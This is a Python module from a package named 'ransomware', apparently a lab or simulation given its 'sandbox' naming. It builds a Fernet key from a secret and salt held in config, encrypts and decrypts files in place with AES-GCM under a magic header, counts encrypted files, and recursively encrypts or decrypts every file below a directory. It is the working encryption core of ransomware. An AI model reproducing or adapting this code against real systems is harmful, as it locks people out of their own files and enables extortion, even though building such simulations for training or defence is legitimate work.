import base64
import hashlib
import os
from pathlib import Path

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from ransomware.config import AES_KEY, AES_NONCE_SIZE, ENCRYPTED_FILE_MAGIC
from ransomware.config import FERNET_SECRET, FERNET_SALT


def make_fernet() -> Fernet:
    secret = FERNET_SECRET
    salt = FERNET_SALT
    key = hashlib.scrypt(secret, salt=salt, n=2**14, r=8, p=1, dklen=32)

    return Fernet(base64.urlsafe_b64encode(key))

def aes_crypt(data: bytes, key: bytes) -> bytes:
    nonce = os.urandom(AES_NONCE_SIZE)
    ciphertext = AESGCM(key).encrypt(nonce, data, None)

    return ENCRYPTED_FILE_MAGIC + nonce + ciphertext


def aes_decrypt(data: bytes, key: bytes) -> bytes:
    if not data.startswith(ENCRYPTED_FILE_MAGIC):
        raise ValueError("File is not AES-encrypted with the expected format.")

    payload = data[len(ENCRYPTED_FILE_MAGIC) :]
    nonce = payload[:AES_NONCE_SIZE]
    ciphertext = payload[AES_NONCE_SIZE:]

    return AESGCM(key).decrypt(nonce, ciphertext, None)


def is_encrypted_file(path: Path) -> bool:
    if not path.is_file():
        return False

    with path.open("rb") as handle:
        return handle.read(len(ENCRYPTED_FILE_MAGIC)) == ENCRYPTED_FILE_MAGIC


def sandbox_file_counts(sandbox: Path) -> tuple[int, int]:
    if not sandbox.exists():
        return 0, 0

    total_files = 0
    encrypted_files = 0

    for path in sandbox.rglob("*"):
        if not path.is_file():
            continue

        total_files += 1

        if is_encrypted_file(path):
            encrypted_files += 1

    return total_files, encrypted_files


def encrypt_file(path: Path) -> bool:
    if not path.is_file() or is_encrypted_file(path):
        return False

    path.write_bytes(aes_crypt(path.read_bytes(), AES_KEY))

    return True


def decrypt_file(path: Path) -> bool:
    if not path.is_file() or not is_encrypted_file(path):
        return False

    path.write_bytes(aes_decrypt(path.read_bytes(), AES_KEY))

    return True


def encrypt_all(sandbox: Path) -> int:
    if not sandbox.exists():
        return 0

    count = 0

    for path in sandbox.rglob("*"):
        if encrypt_file(path):
            count += 1

    return count


def decrypt_all(sandbox: Path) -> int:
    if not sandbox.exists():
        return 0

    count = 0

    for path in sandbox.rglob("*"):
        if decrypt_file(path):
            count += 1

    return count
